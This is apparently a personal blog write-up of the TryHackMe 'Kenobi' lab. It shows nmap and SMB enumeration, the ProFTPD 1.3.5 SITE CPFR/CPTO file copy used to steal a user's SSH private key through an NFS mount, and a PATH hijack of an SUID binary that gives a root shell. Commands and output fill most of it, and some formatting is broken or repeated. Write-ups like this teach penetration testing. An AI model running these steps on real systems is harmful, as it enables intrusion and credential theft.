---
date: 24/7/2025
layout: post
title: Kenobi
subtitle: Kenobi for TyHackMe Writeup.
description: >-
  in this blog i've explained how to root Kenobi from TryHackMe
image: https://tryhackme-images.s3.amazonaws.com/room-icons/46f437a95b1de43238c290a9c416c8d4.png
optimized_image: https://tryhackme-images.s3.amazonaws.com/room-icons/46f437a95b1de43238c290a9c416c8d4.png
category: tryhackme
tags:
  - tryhackme
  - injection
author: Mustafa Eltayeb
paginate: true
---


# Room Name [Kenobi](https://tryhackme.com/room/kenobi# "Kenobi")


![](https://i.imgur.com/OcA2KrK.gif)

This room [Kenobi On TryHackMe] will cover accessing a Samba share, manipulating a vulnerable version of proftpd to gain initial access and escalate your privileges to root via an SUID binary.

----

# Objective of room

This room will cover 
1. Accessing a Samba share
2. Manipulating a vulnerable version of proftpd to gain initial access 
3. Escalate privileges to root via an SUID binary.

----

Nmap

----

AS always i start with nmap to scan for open ports and services in this machine.

>**nmap -sS -sC -sV -A 10.10.194.61**

Result

```js
PORT     STATE SERVICE     VERSION
21/tcp   open  ftp         ProFTPD 1.3.5
22/tcp   open  ssh         OpenSSH 7.2p2 Ubuntu 4ubuntu2.7 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 b3:ad:83:41:49:e9:5d:16:8d:3b:0f:05:7b:e2:c0:ae (RSA)
|   256 f8:27:7d:64:29:97:e6:f8:65:54:65:22:f7:c8:1d:8a (ECDSA)
|_  256 5a:06:ed:eb:b6:56:7e:4c:01:dd:ea:bc:ba:fa:33:79 (ED25519)
80/tcp   open  http        Apache httpd 2.4.18 ((Ubuntu))
| http-robots.txt: 1 disallowed entry 
|_/admin.html
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Site doesn't have a title (text/html).
111/tcp  open  rpcbind     2-4 (RPC #100000)
| rpcinfo: 
|   program version    port/proto  service
|   100000  2,3,4        111/tcp   rpcbind
|   100000  2,3,4        111/udp   rpcbind
|   100000  3,4          111/tcp6  rpcbind
|   100000  3,4          111/udp6  rpcbind
|   100003  2,3,4       2049/tcp   nfs
|   100003  2,3,4       2049/tcp6  nfs
|   100003  2,3,4       2049/udp   nfs
|   100003  2,3,4       2049/udp6  nfs
|   100005  1,2,3      41374/udp   mountd
|   100005  1,2,3      43227/tcp   mountd
|   100005  1,2,3      49520/udp6  mountd
|   100005  1,2,3      54553/tcp6  mountd
|   100021  1,3,4      36073/tcp   nlockmgr
|   100021  1,3,4      42083/tcp6  nlockmgr
|   100021  1,3,4      43037/udp   nlockmgr
|   100021  1,3,4      52998/udp6  nlockmgr
|   100227  2,3         2049/tcp   nfs_acl
|   100227  2,3         2049/tcp6  nfs_acl
|   100227  2,3         2049/udp   nfs_acl
|_  100227  2,3         2049/udp6  nfs_acl
139/tcp  open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
445/tcp  open  netbios-ssn Samba smbd 4.3.11-Ubuntu (workgroup: WORKGROUP)
2049/tcp open  nfs_acl     2-3 (RPC #100227)
MAC Address: 02:A3:62:D4:4F:21 (Unknown)
No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
TCP/IP fingerprint:
OS:SCAN(V=7.80%E=4%D=12/14%OT=21%CT=1%CU=30822%PV=Y%DS=1%DC=D%G=Y%M=02A362%
OS:TM=61B867D2%P=x86_64-pc-linux-gnu)SEQ(SP=107%GCD=1%ISR=107%TI=Z%CI=I%II=
OS:I%TS=8)OPS(O1=M2301ST11NW7%O2=M2301ST11NW7%O3=M2301NNT11NW7%O4=M2301ST11
OS:NW7%O5=M2301ST11NW7%O6=M2301ST11)WIN(W1=68DF%W2=68DF%W3=68DF%W4=68DF%W5=
OS:68DF%W6=68DF)ECN(R=Y%DF=Y%T=40%W=6903%O=M2301NNSNW7%CC=Y%Q=)T1(R=Y%DF=Y%
OS:T=40%S=O%A=S+%F=AS%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=
OS:R%O=%RD=0%Q=)T5(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T
OS:=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=
OS:0%Q=)U1(R=Y%DF=N%T=40%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(
OS:R=Y%DFI=N%T=40%CD=S)

Network Distance: 1 hop
Service Info: Host: KENOBI; OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

Host script results:
|_clock-skew: mean: 1h59m59s, deviation: 3h27m50s, median: 0s
|_nbstat: NetBIOS name: KENOBI, NetBIOS user: <unknown>, NetBIOS MAC: <unknown> (unknown)
| smb-os-discovery: 
|   OS: Windows 6.1 (Samba 4.3.11-Ubuntu)
|   Computer name: kenobi
|   NetBIOS computer name: KENOBI\x00
|   Domain name: \x00
|   FQDN: kenobi
|_  System time: 2021-12-14T03:45:53-06:00
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| smb2-security-mode: 
|   2.02: 
|_    Message signing enabled but not required
| smb2-time: 
|   date: 2021-12-14T09:45:53
|_  start_date: N/A

TRACEROUTE
HOP RTT     ADDRESS
1   0.55 ms ip-10-10-194-61.eu-west-1.compute.internal (10.10.194.61)

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/

```

33 We got ssh on port 22 and ftp on port 21 and http on port 80 and rpcbind on port 111 and smbd on port 139 & 445

-----

# SMB Enumeration

>**nmap -p 445 --script=smb-enum-shares.nse,smb-enum-users.nse 10.10.194.61 **

```js
Host script results:
| smb-enum-shares: 
|   account_used: guest
|   \\10.10.194.61\IPC$: 
|     Type: STYPE_IPC_HIDDEN
|     Comment: IPC Service (kenobi server (Samba, Ubuntu))
|     Users: 1
|     Max Users: <unlimited>
|     Path: C:\tmp
|     Anonymous access: READ/WRITE
|     Current user access: READ/WRITE
|   \\10.10.194.61\anonymous: 
|     Type: STYPE_DISKTREE
|     Comment: 
|     Users: 0
|     Max Users: <unlimited>
|     Path: C:\home\kenobi\share
|     Anonymous access: READ/WRITE
|     Current user access: READ/WRITE
|   \\10.10.194.61\print$: 
|     Type: STYPE_DISKTREE
|     Comment: Printer Drivers
|     Users: 0
|     Max Users: <unlimited>
|     Path: C:\var\lib\samba\printers
|     Anonymous access: <none>
|_    Current user access: <none>
|_smb-enum-users: ERROR: Script execution failed (use -d to debug)

```
We have 

```js
\\10.10.194.61\anonymous
```
## Try to connect with SMB via anonymous


>**smbclient \\10.10.194.61\anonymous**

```js
root@kali:~/Desktop# smbclient //10.10.194.61/anonymous
Enter WORKGROUP\root's password: 
Try "help" to get a list of possible commands.
smb: \> 

smb: \> ls
  .                                   D        0  Wed Sep  4 10:49:09 2019
  ..                                  D        0  Wed Sep  4 10:56:07 2019
  log.txt                             N    12237  Wed Sep  4 10:49:09 2019

                9204224 blocks of size 1024. 6877092 blocks available
smb: \> get log.txt
getting file \log.txt of size 12237 as log.txt (3983.3 KiloBytes/sec) (average 3983.4 KiloBytes/sec)
smb: \> 
```root@kali:~/Desktop# smbclient //10.10.194.61/anonymous
Enter WORKGROUP\root's password: 
Try "help" to get a list of possible commands.
smb: \> 

smb: \> ls
  .                                   D        0  Wed Sep  4 10:49:09 2019
  ..                                  D        0  Wed Sep  4 10:56:07 2019
  log.txt                             N    12237  Wed Sep  4 10:49:09 2019

                9204224 blocks of size 1024. 6877092 blocks available
smb: \> get log.txt
getting file \log.txt of size 12237 as log.txt (3983.3 KiloBytes/sec) (average 3983.4 KiloBytes/sec)
smb: \> 
```
----

## we get log.txt it has sensitive information 
path of ssh id_rsa &rarr; /home/kenobi/.ssh/id_rsa

# rpcbind Enumeration
we have rpcbind service running on port 111 
>**nmap -p 111 --script=nfs-ls,nfs-statfs,nfs-showmount**

```js
PORT    STATE SERVICE
111/tcp open  rpcbind
| nfs-ls: Volume /var
|   access: Read Lookup NoModify NoExtend NoDelete NoExecute
| PERMISSION  UID  GID  SIZE  TIME                 FILENAME
| rwxr-xr-x   0    0    4096  2019-09-04T08:53:24  .
| rwxr-xr-x   0    0    4096  2019-09-04T12:27:33  ..
| rwxr-xr-x   0    0    4096  2019-09-04T12:09:49  backups
| rwxr-xr-x   0    0    4096  2019-09-04T10:37:44  cache
| rwxrwxrwt   0    0    4096  2019-09-04T08:43:56  crash
| rwxrwsr-x   0    50   4096  2016-04-12T20:14:23  local
| rwxrwxrwx   0    0    9     2019-09-04T08:41:33  lock
| rwxrwxr-x   0    108  4096  2019-09-04T10:37:44  log
| rwxr-xr-x   0    0    4096  2019-01-29T23:27:41  snap
| rwxr-xr-x   0    0    4096  2019-09-04T08:53:24  www
|_
| nfs-showmount: 
|_  /var *
| nfs-statfs: 
|   Filesystem  1K-blocks  Used       Available  Use%  Maxfilesize  Maxlink
|_  /var        9204224.0  1836540.0  6877088.0  22%   16.0T        32000

```
-----

## We have var Directoy and know the FTP version ProFTPD 1.3.5 
Go to [exploit-db](http://https://www.exploit-db.com/ "exploit-db") and search for exploit or use Searchsploit

### We have [File Copy](https://www.exploit-db.com/exploits/36742http:// "File Copy")

# Connect to FTP via nc on port 21

```js
nc 10.10.194.61 21

```

>**now we will copy the ssh id_rsa from /home/kenobi/.ssh/id_rsa to /var/tmp/**

```js
nc 10.10.194.61 21
220 ProFTPD 1.3.5 Server (ProFTPD Default Installation) [10.10.194.61]
SITE CPFR /home/kenobi/.ssh/id_rsa
350 File or directory exists, ready for destination name
SITE CPTO /var/tmp/id_rsa
250 Copy successful

```
go and make folder like H3X0S3

>**mount 10.10.194.61:/var /H3X0S3**

```js

h3x0s3@H3X0S3:~/Desktop/Kenobi/H3X0S3/tmp$ ls
id_rsa
systemd-private-2408059707bc41329243d2fc9e613f1e-systemd-timesyncd.service-a5PktM
systemd-private-6f4acd341c0b40569c92cee906c3edc9-systemd-timesyncd.service-z5o4Aw
systemd-private-e69bbb0653ce4ee3bd9ae0d93d2a5806-systemd-timesyncd.service-zObUdn
systemd-private-f18eb9060cee48bfb075c2f77bb32d13-systemd-timesyncd.service-lkh7vB

h3x0s3@H3X0S3:~/Desktop/Knobi/H3X0S3/tmp$ chmod 600 id_rsa
chmod: changing permissions of 'id_rsa': Read-only file system

```
>**Use id_rsa to connect to ssh**

```js
ssh -i id_rsa kenobi@10.10.28.52
kenobi@kenobi:~$ cat user.txt 
THM{D0Nt_C0Py_AND_PaST}
kenobi@kenobi:~$ 
```

-----


# Time for some privilege escalation 

----

## SUID 
(Set owner User ID up on execution) is a special type of file permissions given to a file. Normally in Linux/Unix when a program runs, it inherits access permissions from the logged in user.

[SUID](http://https://www.linux.com/training-tutorials/what-suid-and-how-set-suid-linuxunix/ "SUID")

### Use 
 >**ind / -type f -perm -u=s 2>/dev/null**
to search for files with a misconfigured SUID let us to get root privileges

```js
kenobi@kenobi:~$ find / -type f -perm -u=s 2>/dev/null
/sbin/mount.nfs
/usr/lib/policykit-1/polkit-agent-helper-1
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/lib/snapd/snap-confine
/usr/lib/eject/dmcrypt-get-device
/usr/lib/openssh/ssh-keysign
/usr/lib/x86_64-linux-gnu/lxc/lxc-user-nic
/usr/bin/chfn
/usr/bin/newgidmap
/usr/bin/pkexec
/usr/bin/passwd
/usr/bin/newuidmap
/usr/bin/gpasswd
/usr/bin/menu
/usr/bin/sudo
/usr/bin/chsh
/usr/bin/at
/usr/bin/newgrp
/bin/umount
/bin/fusermount
/bin/mount
/bin/ping
/bin/su
/bin/ping6
kenobi@kenobi:~$
```

## The /usr/bin/menu file looks intersest. Let's run this binary. we get this output with 3 options to select:

```js
kenobi@kenobi:~$ /usr/bin/menu

***************************************
1. status check
2. kernel version
3. ifconfig
** Enter your choice :
```
## In 1. status check like curl.
we make can file and name it as curl and copy /bin/bash to it then make it  readable, writeable and executable then add the path of curl file to bash shell of the system path

```js
kenobi@kenobi:/tmp$ echo /bin/bash > curl 
kenobi@kenobi:/tmp$ chmod +x curl
kenobi@kenobi:/tmp$ export PATH=/tmp:$PATH
kenobi@kenobi:/tmp$ /usr/bin/menu

***************************************
1. status check
2. kernel version
3. ifconfig
** Enter your choice :1
To run a command as administrator (user "root"), use "sudo <command>".
See "man sudo_root" for details.

root@kenobi:/tmp# id
uid=0(root) gid=1000(kenobi) groups=1000(kenobi),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),110(lxd),113(lpadmin),114(sambashare)
```

# Search for root flag

```js
root@kenobi:/tmp# cd /root 

root@kenobi:/root# cat root.txt 
THM{D0Nt_C0Py_AND_PaST}
root@kenobi:/root# 

```


<iframe src="https://tryhackme.com/api/v2/badges/public-profile?userPublicId=3186403" style='border:none;'></iframe>
